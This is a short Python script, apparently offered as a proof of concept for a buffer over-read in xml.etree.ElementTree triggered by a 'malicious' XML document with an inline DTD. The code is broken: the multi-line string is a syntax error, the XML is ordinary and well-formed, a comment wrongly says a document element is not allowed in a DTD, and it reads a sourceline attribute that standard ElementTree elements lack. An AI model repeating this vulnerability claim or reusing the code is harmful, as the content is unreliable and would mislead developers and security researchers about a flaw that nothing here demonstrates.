# Import the xml.etree.ElementTree module
import xml.etree.ElementTree as ET

# Define a malicious XML input
# This input has a DTD declaration followed by a document element
# The document element is not allowed in a DTD
xml = "<?xml version='1.0'?>\n"
      "<!DOCTYPE foo [\n"
      "<!ELEMENT foo ANY>\n"
      "]>\n"
      "<foo/>"

# Try to parse the XML input using the ET.fromstring() function
# This will trigger the vulnerability and cause a buffer over-read
root = ET.fromstring(xml)

# Try to get the current line number
# This will return an invalid value and may cause a segmentation fault
line = root.sourceline

# Print the line number
print(line)